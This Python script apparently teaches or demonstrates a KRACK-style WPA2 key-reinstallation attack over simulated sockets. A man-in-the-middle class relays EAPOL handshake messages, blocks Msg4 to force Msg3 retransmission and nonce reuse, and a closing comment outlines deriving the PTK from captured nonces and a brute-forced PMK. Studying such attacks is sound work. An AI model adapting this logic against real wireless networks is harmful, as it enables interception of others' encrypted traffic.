import socket
import logging
from eapol import EAPOLMessage
from const import *
from utils import *

"""
The security of encryption (AES-CCMP or TKIP) relies on
never reusing the same nonce (number used once) with the same key.
If an attacker can force the reuse of a nonce, they can break encryption.

The attacker blocks/drops Msg4 (the ACK from the client).
The AP, not receiving confirmation, retransmits Msg3.
The client receives Msg3 again and reinstalls the same PTK.
This causes nonce reset (since the encryption state is reset), leading to nonce reuse.
"""

class MITMAttacker:
    def __init__(self):
        self.client_conn = None
        self.server_conn = None
        self.ptk = None
        #self.pmk = PMK

    def start(self):
        # Set up client listener
        client_sock = create_socket()
        client_sock.bind((MITM_ADDR, MITM_PORT))
        client_sock.listen(1)
        
        # Wait for client first
        logging.info("Waiting for client connection...")
        self.client_conn, addr = client_sock.accept()
        logging.info(f"Client connected from {addr[0]}")
        
        # Connect to server after client is connected
        self.server_conn = create_socket()
        if not connect_with_retry(self.server_conn, SERVER_ADDR, SERVER_PORT):
            logging.error("Failed to connect to server")
            return False
            
        return True

    def forward_eapol(self, src, dst, label):
        data = src.recv(BUFF_SIZE)
        msg = EAPOLMessage.deserialize(data)

        logging.info(f"{label}: {msg}")
        # Send full message
        dst.send(data)
        return data
        
    def execute_attack(self):
        log_phase(1, "Initial Handshake Forwarding")
        
        # Forward Msg1
        step_prompt("forward Msg1 to client")
        self.forward_eapol(self.server_conn, self.client_conn, "Msg1")
        
        # Forward Msg2
        step_prompt("forward Msg2 to server")
        self.forward_eapol(self.client_conn, self.server_conn, "Msg2")
        
        # Forward Msg3
        step_prompt("forward Msg3 to client")
        self.forward_eapol(self.server_conn, self.client_conn, "Msg3")
        
        # Block Msg4
        log_phase(2, "Blocking Msg4")
        step_prompt("block Msg4")
        data = self.client_conn.recv(BUFF_SIZE)
        logging.warning(f"Blocked Msg4: {EAPOLMessage.deserialize(data)}")
        
        # Retransmit Msg3
        log_phase(3, "Forwarding Retransmitted Msg3")
        step_prompt("forward retransmitted Msg3")
        self.forward_eapol(self.server_conn, self.client_conn, "Msg3 retransmit")
          
    def run(self):
        clear_screen()
        print(Colors.RED, MITM_SPLASH_SCREEN, Colors.END)
        setup_logging()
        
        if not self.start():
            return
            
        try:
            self.execute_attack()
        finally:
            self.client_conn.close()
            self.server_conn.close()
            input("\nPress Enter to exit...")

if __name__ == "__main__":
    attacker = MITMAttacker()
    attacker.run()


"""
Nonces are sent in clear, and the attacker observes it:
    observed_anonce = None
    observed_snonce = None
    if label == "Msg1":
            self.observed_anonce = msg.key_nonce.hex()
            logging.info(f"Intercepted ANonce -> {self.observed_anonce}")
        elif label == "Msg2":
            self.observed_snonce = msg.key_nonce.hex()
            logging.info(f"Intercepted SNonce -> {self.observed_snonce}")

By bruteforcing the PMK -> WPA2 Personal where the PMK is the router password,
the attacker can calculate the PTK:
    logging.info("...Calculating PTK from intercepted Nonces...")
        if observed_anonce and observed_snonce:
            self.ptk = calculate_ptk(
                    pmk, # Brute forced offline (only WPA2 Personal)
                    observed_anonce,
                    observed_snonce,
                    CLIENT_MAC,
                    AP_MAC
                )
            logging.info(f"Calculated PTK: {self.ptk}")
"""
